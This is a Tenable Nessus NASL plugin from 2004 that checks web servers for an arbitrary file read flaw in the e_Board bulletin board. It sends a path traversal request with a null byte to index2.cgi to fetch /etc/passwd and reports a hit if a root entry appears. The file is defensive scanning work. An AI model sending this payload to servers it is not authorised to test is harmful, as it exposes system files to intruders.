#
# (C) Tenable Network Security
#

if(description)
{
 script_id(16044);
 script_bugtraq_id(12048);
 script_version ("$Revision: 1.2 $");
 
 name["english"] = "e_Board arbitrary file reading";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running e_Board - a web-based bulletin board system
written in PERL.

There is a bug in this software which may allow an attacker to read 
arbitary files on the remote web server with the privileges of the
web user.

Solution : Upgrade to the latest version of e_Board or disable this software
Risk factor : Medium";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for e_Board";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (make_list("/cgi-bin/eboard40/", cgi_dirs()))
{
 req = string(dir,"/index2.cgi?frames=yes&board=demo&mode=Current&threads=Collapse&message=../../../../../../../../../../etc/passwd%00");
 req = http_get(item:req, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if( buf == NULL ) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
 	security_warning(port);
	exit(0);
	}
}
